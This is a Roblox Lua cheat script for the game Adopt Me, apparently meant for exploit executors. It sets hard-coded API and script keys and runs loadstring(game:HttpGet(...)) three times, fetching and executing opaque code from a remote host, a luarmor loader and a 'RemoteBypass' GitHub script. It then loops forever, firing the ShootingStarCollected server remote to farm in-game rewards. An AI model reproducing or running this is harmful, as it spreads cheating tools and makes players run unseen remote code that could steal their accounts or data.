
task.spawn(function()
    task.wait(35)
    getgenv().API_KEY = "pQP1Ma1WE4h81mPToP54"
    loadstring(game:HttpGet("http://ii.sebas.sbs:4241/adoptme/dashboard.lua"))()
end)

task.spawn(function()
   -- ARCEUS, CODEX ETC
script_key="NxzplPKcRYahKMvLcZtfTAOQURrRclwP";
getgenv().Config = {
    ["Winter_EVENT"] = false,
    ["PetFarmActive"] = true,
    ["EggFarmActive"] = false,
    ["Blur_username"] = true,
    ["Blazing_Lion_Log"] = false,
    ["DiscordId"] = "942321951010086922",
    ["Webhook"] = "https://discord.com/api/webhooks/123456",
}
loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/66567bfd337b57eb059b58dbe1badb89.lua"))()
end)
wait(1)
loadstring(game:HttpGet("https://raw.githubusercontent.com/Xenijo/AdoptMe-RemoteBypass/main/Bypass.lua"))()
wait(1)
local locations = {"Neighborhood", "MainMap", "SkyCastle", "LNY2025GlitchZone"}

while true do  -- loop infinitely
    for i = 1, 100 do
        for _, location in ipairs(locations) do
            local args = {
                [1] = location,
                [2] = tostring(i)
            }
            game:GetService("ReplicatedStorage").API:FindFirstChild("MoonAPI/ShootingStarCollected"):FireServer(unpack(args))
            wait(0.2)  -- 0.5 second delay prevent crash.. don't remove this to execute faster
        end
    end
    wait(43200)  -- loop every 12h
end
